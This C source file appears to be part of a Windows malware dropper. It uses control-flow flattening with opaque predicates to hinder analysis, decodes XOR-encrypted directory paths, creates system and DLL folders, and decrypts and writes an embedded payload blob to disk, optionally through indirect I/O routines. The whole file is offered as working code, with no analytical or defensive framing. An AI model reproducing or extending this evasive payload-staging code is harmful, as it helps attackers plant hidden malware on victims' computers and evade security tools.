#include "cff.h"
#include "indirect.h"

#define CFF_FILE_OPEN 10
#define CFF_FILE_WRITE 11
#define CFF_FILE_CLOSE 12

static void cff_mkdir_one(unsigned char *enc, int len, char *buf, int cap,
                           CFF_IO *io) {
  if (!enc || !buf || !io)
    return;
  dc_xd(enc, buf, len);
  dc_path_expand(buf, cap, io->expand);
  if (io->use_indirect)
    io_create_directory_a(buf);
  else if (io->mkdir)
    io->mkdir(buf, NULL);
}

__attribute__((noinline, optimize("O0")))
int cff_step(int cur, int nxt, volatile ULONG64 *acc) {
  volatile ULONG64 x;
  volatile ULONG64 y;
  volatile ULONG64 v0;
  volatile ULONG64 v1;
  volatile ULONG64 v2;

  if (!acc)
    return nxt;

  x = *acc;
  y = x ^ (x >> 13);
  y = (y * 0x5851F42D4C957F2DULL) ^ (ULONG64)cur;
  y ^= (y >> 7);
  y = (y * 6364136223846793005ULL) + (ULONG64)nxt;
  *acc = y;

  v0 = y + ((ULONG64)cur << 3);
  v1 = v0 ^ ((ULONG64)nxt << 5);
  v2 = v1 ^ ((ULONG64)nxt << 5);

  if (v0 == v2) {
    if (((x ^ y) & 0xFFFFULL) == 0xBEEFULL)
      return cur;
    return nxt;
  }

  if ((((ULONG64)cur * 4ULL) ^ ((ULONG64)nxt * 4ULL)) == 0xFFFFFFFFULL)
    return cur;
  return nxt;
}

__attribute__((noinline, optimize("O0")))
void cff_sys_dirs(CFF_ENC *dirs, int count, char *buf, int cap, CFF_IO *io,
                  volatile ULONG64 *acc) {
  volatile int st = 1;

  if (!dirs || count < 5 || !buf || !io)
    return;

  while (st != CFF_DONE) {
    switch (st) {
    case 4:
      cff_mkdir_one(dirs[3].enc, dirs[3].len, buf, cap, io);
      st = cff_step(4, 5, acc);
      break;
    case 2:
      cff_mkdir_one(dirs[1].enc, dirs[1].len, buf, cap, io);
      st = cff_step(2, 3, acc);
      break;
    case 5:
      cff_mkdir_one(dirs[4].enc, dirs[4].len, buf, cap, io);
      st = cff_step(5, CFF_DONE, acc);
      break;
    case 3:
      cff_mkdir_one(dirs[2].enc, dirs[2].len, buf, cap, io);
      st = cff_step(3, 4, acc);
      break;
    case 1:
      cff_mkdir_one(dirs[0].enc, dirs[0].len, buf, cap, io);
      st = cff_step(1, 2, acc);
      break;
    default:
      st = CFF_DONE;
      break;
    }
  }
}

__attribute__((noinline, optimize("O0")))
void cff_dll_dirs(CFF_ENC *dirs, int count, char *buf, int cap, CFF_IO *io,
                  volatile ULONG64 *acc) {
  volatile int st = 1;

  if (!dirs || count < 3 || !buf || !io)
    return;

  while (st != CFF_DONE) {
    switch (st) {
    case 2:
      cff_mkdir_one(dirs[1].enc, dirs[1].len, buf, cap, io);
      st = cff_step(2, 3, acc);
      break;
    case 1:
      cff_mkdir_one(dirs[0].enc, dirs[0].len, buf, cap, io);
      st = cff_step(1, 2, acc);
      break;
    case 3:
      cff_mkdir_one(dirs[2].enc, dirs[2].len, buf, cap, io);
      st = cff_step(3, CFF_DONE, acc);
      break;
    default:
      if (((volatile ULONG64)st * 0ULL) == 0xBEEFULL)
        st = 1;
      st = CFF_DONE;
      break;
    }
  }
}

__attribute__((noinline, optimize("O0")))
void cff_write_payload(const char *path, unsigned char *blob, int blob_len,
                       CFF_IO *io, volatile ULONG64 *acc) {
  volatile int st = CFF_FILE_OPEN;
  HANDLE hFile = INVALID_HANDLE_VALUE;
  DWORD written = 0;
  int current_offset = 0;
  int chunk_size = 4096;
  int sz;

  if (!path || !blob || blob_len <= 0 || !io)
    return;

  while (st != CFF_DONE) {
    switch (st) {
    case CFF_FILE_OPEN:
      if (io->use_indirect)
        hFile = io_create_file_a(path, GENERIC_WRITE, CREATE_ALWAYS);
      else if (io->create)
        hFile = io->create(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
      st = cff_step(CFF_FILE_OPEN, CFF_FILE_WRITE, acc);
      break;
    case CFF_FILE_WRITE:
      if (hFile != INVALID_HANDLE_VALUE) {
        current_offset = 0;
        while (current_offset < blob_len) {
          sz = blob_len - current_offset;
          if (sz > chunk_size)
            sz = chunk_size;
          dc_xb(blob + current_offset, blob + current_offset, sz,
                current_offset);
          if (io->use_indirect)
            io_write_file(hFile, blob + current_offset, (DWORD)sz, &written);
          else if (io->write)
            io->write(hFile, blob + current_offset, (DWORD)sz, &written, NULL);
          current_offset += sz;
        }
      }
      st = cff_step(CFF_FILE_WRITE, CFF_FILE_CLOSE, acc);
      break;
    case CFF_FILE_CLOSE:
      if (hFile != INVALID_HANDLE_VALUE) {
        if (io->use_indirect)
          io_close_handle(hFile);
        else if (io->close)
          io->close(hFile);
        hFile = INVALID_HANDLE_VALUE;
      }
      st = cff_step(CFF_FILE_CLOSE, CFF_DONE, acc);
      break;
    default:
      st = CFF_DONE;
      break;
    }
  }
}
